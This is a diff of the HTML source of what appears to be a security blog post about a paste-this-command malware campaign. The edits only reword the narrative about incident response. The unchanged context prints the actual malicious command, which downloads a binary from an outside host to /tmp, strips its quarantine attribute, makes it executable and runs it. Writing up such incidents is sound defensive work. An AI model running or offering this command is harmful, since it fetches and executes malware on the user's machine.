@@ -25,11 +25,10 @@
 &lt;p&gt;The actual command pasted was as follows:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;#!/bin/bash curl -o /tmp/update https://raytherrien.com/n8n/update \&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; xattr -c /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /tmp/update
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks &amp;ndash; we were, in fact, fine.
-Then last week, a founder friend of mine reached out
-and asked if I could hop on a call as one of their engineers seemed to have run some malware on their machine and could I jump in to
-give them a hand with incident response?&lt;/p&gt;
-&lt;p&gt;As soon as I started looking at the logs, it became pretty clear that this was the same as what I saw a few weeks prior, but my
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks &amp;ndash; we were, in fact, fine.&lt;/p&gt;
+&lt;p&gt;Fast forward to last week, when a founder friend of mine reached out
+and asked if I could hop on a call. One of their engineers seemed to have run some malware on their machine, and they asked if I&amp;rsquo;d mind jumping into help
+with incident response. As soon as I started looking at the logs, it became pretty clear that this was the same as what I saw a few weeks prior, but my
 friend&amp;rsquo;s company hadn&amp;rsquo;t been so lucky. Their EDR solution had noted that this looked suspicious as all get out and set off alarm bells,
 but only &lt;em&gt;after&lt;/em&gt; allowing the execution to proceed.&lt;/p&gt;
 &lt;h1 id=&#34;we-have-all-been-trained-to-do-stupid-things&#34; &gt;We Have All Been Trained to do Stupid Things
